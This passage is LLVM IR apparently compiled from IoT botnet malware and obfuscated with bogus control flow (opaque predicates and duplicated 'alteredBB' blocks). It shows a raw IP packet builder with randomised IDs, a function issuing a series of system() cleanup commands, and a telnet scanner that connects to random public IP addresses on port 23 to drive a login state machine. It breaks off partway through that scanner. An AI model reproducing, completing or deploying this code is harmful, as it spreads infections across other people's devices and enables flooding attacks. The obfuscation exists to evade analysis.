  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = load i32, i32* @x.67
  %3 = load i32, i32* @y.68
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  %12 = load i32, i32* %11, align 4
  %13 = icmp sgt i32 3, %12
  %14 = load i32, i32* @x.67
  %15 = load i32, i32* @y.68
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %23

; <label>:22:                                     ; preds = %originalBBpart2
  store i32 1, i32* %10, align 4
  br label %26

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* %11, align 4
  %25 = call i32 @close(i32 %24)
  store i32 0, i32* %10, align 4
  br label %26

; <label>:26:                                     ; preds = %23, %22
  %27 = load i32, i32* %10, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i32 %0, i32* %29, align 4
  %30 = load i32, i32* %29, align 4
  %31 = icmp sgt i32 3, %30
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.474, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.475, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.476, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.477, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.478, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.479, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.480, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.481, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.482, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.483, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.484, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.485, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.486, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %27, %28
  br i1 %29, label %30, label %32

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %5, align 4
  br label %32

; <label>:32:                                     ; preds = %30, %2
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = call zeroext i16 @htons(i16 zeroext 23) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = call noalias i8* @malloc(i64 1025) #5
  store i8* %38, i8** %17, align 8
  %39 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 1025, i32 1, i1 false)
  %40 = load i32, i32* %5, align 4
  %41 = zext i32 %40 to i64
  %42 = call i8* @llvm.stacksave()
  store i8* %42, i8** %19, align 8
  %43 = alloca %struct.telstate_t, i64 %41, align 16
  %44 = bitcast %struct.telstate_t* %43 to i8*
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 5
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 %47, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %48

; <label>:48:                                     ; preds = %66, %32
  %49 = load i32, i32* %6, align 4
  %50 = load i32, i32* %5, align 4
  %51 = icmp slt i32 %49, %50
  br i1 %51, label %52, label %69

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %54
  %56 = bitcast %struct.telstate_t* %55 to i8*
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 32, i32 16, i1 false)
  %57 = load i32, i32* %6, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %58
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 3
  store i8 1, i8* %60, align 1
  %61 = load i8*, i8** %17, align 8
  %62 = load i32, i32* %6, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %63
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i32 0, i32 9
  store i8* %61, i8** %65, align 8
  br label %66

; <label>:66:                                     ; preds = %52
  %67 = load i32, i32* %6, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %6, align 4
  br label %48

; <label>:69:                                     ; preds = %48
  %70 = load i32, i32* @x.71
  %71 = load i32, i32* @y.72
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %69
  %78 = load i32, i32* @x.71
  %79 = load i32, i32* @y.72
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %86

; <label>:86:                                     ; preds = %originalBBpart2125, %originalBBpart2
  br label %87

; <label>:87:                                     ; preds = %86
  store i32 0, i32* %6, align 4
  br label %88

; <label>:88:                                     ; preds = %originalBBpart2121, %87
  %89 = load i32, i32* %6, align 4
  %90 = load i32, i32* %5, align 4
  %91 = icmp slt i32 %89, %90
  br i1 %91, label %92, label %1349

; <label>:92:                                     ; preds = %88
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 7
  %97 = load i32, i32* %96, align 16
  %98 = icmp eq i32 %97, 0
  br i1 %98, label %99, label %106

; <label>:99:                                     ; preds = %92
  %100 = call i64 @time(i64* null) #5
  %101 = trunc i64 %100 to i32
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %103
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %104, i32 0, i32 7
  store i32 %101, i32* %105, align 16
  br label %106

; <label>:106:                                    ; preds = %99, %92
  %107 = load i32, i32* %6, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %108
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %109, i32 0, i32 2
  %111 = load i8, i8* %110, align 8
  %112 = zext i8 %111 to i32
  switch i32 %112, label %1313 [
    i32 0, label %113
    i32 1, label %361
    i32 2, label %496
    i32 3, label %596
    i32 4, label %641
    i32 5, label %709
    i32 6, label %754
    i32 7, label %918
    i32 8, label %1032
  ]

; <label>:113:                                    ; preds = %106
  %114 = load i32, i32* %6, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %115
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %116, i32 0, i32 3
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 1
  br i1 %120, label %121, label %157

; <label>:121:                                    ; preds = %113
  %122 = load i32, i32* @x.71
  %123 = load i32, i32* @y.72
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %121
  %130 = load i32, i32* %6, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 9
  %134 = load i8*, i8** %133, align 8
  store i8* %134, i8** %20, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %136
  %138 = bitcast %struct.telstate_t* %137 to i8*
  call void @llvm.memset.p0i8.i64(i8* %138, i8 0, i64 32, i32 16, i1 false)
  %139 = load i8*, i8** %20, align 8
  %140 = load i32, i32* %6, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 9
  store i8* %139, i8** %143, align 8
  %144 = call i32 @getRandomPublicIP()
  %145 = load i32, i32* %6, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %146
  %148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %147, i32 0, i32 1
  store i32 %144, i32* %148, align 4
  %149 = load i32, i32* @x.71
  %150 = load i32, i32* @y.72
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %221

; <label>:157:                                    ; preds = %113
  %158 = load i32, i32* %6, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %159
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %160, i32 0, i32 3
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 0
  br i1 %164, label %165, label %220

; <label>:165:                                    ; preds = %157
  %166 = load i32, i32* %6, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %167
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %168, i32 0, i32 4
  %170 = load i8, i8* %169, align 2
  %171 = add i8 %170, 1
  store i8 %171, i8* %169, align 2
  %172 = load i32, i32* %6, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 5
  %176 = load i8, i8* %175, align 1
  %177 = add i8 %176, 1
  store i8 %177, i8* %175, align 1
  %178 = load i32, i32* %6, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %179
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %180, i32 0, i32 5
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i64
  %184 = icmp eq i64 %183, 19
  br i1 %184, label %185, label %190

; <label>:185:                                    ; preds = %165
  %186 = load i32, i32* %6, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 3
  store i8 1, i8* %189, align 1
  br label %1330

; <label>:190:                                    ; preds = %165
  %191 = load i32, i32* @x.71
  %192 = load i32, i32* @y.72
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %190
  %199 = load i32, i32* %6, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %200
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %201, i32 0, i32 4
  %203 = load i8, i8* %202, align 2
  %204 = zext i8 %203 to i64
  %205 = icmp eq i64 %204, 19
  %206 = load i32, i32* @x.71
  %207 = load i32, i32* @y.72
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %205, label %214, label %219

; <label>:214:                                    ; preds = %originalBBpart28
  %215 = load i32, i32* %6, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %216
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %217, i32 0, i32 3
  store i8 1, i8* %218, align 1
  br label %1330

; <label>:219:                                    ; preds = %originalBBpart28
  br label %220

; <label>:220:                                    ; preds = %219, %157
  br label %221

; <label>:221:                                    ; preds = %220, %originalBBpart24
  %222 = load i32, i32* @x.71
  %223 = load i32, i32* @y.72
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %221
  %230 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %230, align 4
  %231 = call zeroext i16 @htons(i16 zeroext 23) #10
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %231, i16* %232, align 2
  %233 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %234 = getelementptr inbounds [8 x i8], [8 x i8]* %233, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %234, i8 0, i64 8, i32 4, i1 false)
  %235 = load i32, i32* %6, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 1
  %239 = load i32, i32* %238, align 4
  %240 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %241 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %240, i32 0, i32 0
  store i32 %239, i32* %241, align 4
  %242 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %243 = load i32, i32* %6, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 0
  store i32 %242, i32* %246, align 16
  %247 = load i32, i32* %6, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %248
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %249, i32 0, i32 0
  %251 = load i32, i32* %250, align 16
  %252 = icmp eq i32 %251, -1
  %253 = load i32, i32* @x.71
  %254 = load i32, i32* @y.72
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %252, label %261, label %278

; <label>:261:                                    ; preds = %originalBBpart212
  %262 = load i32, i32* @x.71
  %263 = load i32, i32* @y.72
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %261
  %270 = load i32, i32* @x.71
  %271 = load i32, i32* @y.72
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %1330

; <label>:278:                                    ; preds = %originalBBpart212
  %279 = load i32, i32* %6, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %280
  %282 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %281, i32 0, i32 0
  %283 = load i32, i32* %282, align 16
  %284 = load i32, i32* %6, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = call i32 (i32, i32, ...) @fcntl(i32 %288, i32 3, i8* null)
  %290 = or i32 %289, 2048
  %291 = call i32 (i32, i32, ...) @fcntl(i32 %283, i32 4, i32 %290)
  %292 = load i32, i32* %6, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %293
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 16
  %297 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %298 = call i32 @connect(i32 %296, %struct.sockaddr* %297, i32 16)
  %299 = icmp eq i32 %298, -1
  br i1 %299, label %300, label %340

; <label>:300:                                    ; preds = %278
  %301 = load i32, i32* @x.71
  %302 = load i32, i32* @y.72
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %300
  %309 = call i32* @__errno_location() #10
  %310 = load i32, i32* %309, align 4
  %311 = icmp ne i32 %310, 115
  %312 = load i32, i32* @x.71
  %313 = load i32, i32* @y.72
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %311, label %320, label %340

; <label>:320:                                    ; preds = %originalBBpart220
  %321 = load i32, i32* @x.71
  %322 = load i32, i32* @y.72
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %320
  %329 = load i32, i32* %6, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %330
  call void @reset_telstate(%struct.telstate_t* %331)
  %332 = load i32, i32* @x.71
  %333 = load i32, i32* @y.72
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %360

; <label>:340:                                    ; preds = %originalBBpart220, %278
  %341 = load i32, i32* @x.71
  %342 = load i32, i32* @y.72
  %343 = sub i32 %341, 1
  %344 = mul i32 %341, %343
  %345 = urem i32 %344, 2
  %346 = icmp eq i32 %345, 0
  %347 = icmp slt i32 %342, 10
  %348 = or i1 %346, %347
  br i1 %348, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %340
  %349 = load i32, i32* %6, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %350
  call void @advance_telstate(%struct.telstate_t* %351, i32 1)
  %352 = load i32, i32* @x.71
  %353 = load i32, i32* @y.72
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %360

; <label>:360:                                    ; preds = %originalBBpart228, %originalBBpart224
  br label %1313

; <label>:361:                                    ; preds = %106
  br label %362

; <label>:362:                                    ; preds = %361
  %363 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %364 = getelementptr inbounds [16 x i64], [16 x i64]* %363, i64 0, i64 0
  %365 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %364) #5, !srcloc !5
  %366 = extractvalue { i64, i64* } %365, 0
  %367 = extractvalue { i64, i64* } %365, 1
  %368 = trunc i64 %366 to i32
  store i32 %368, i32* %21, align 4
  %369 = ptrtoint i64* %367 to i64
  %370 = trunc i64 %369 to i32
  store i32 %370, i32* %22, align 4
  br label %371

; <label>:371:                                    ; preds = %362
  %372 = load i32, i32* @x.71
  %373 = load i32, i32* @y.72
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %371
  %380 = load i32, i32* @x.71
  %381 = load i32, i32* @y.72
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
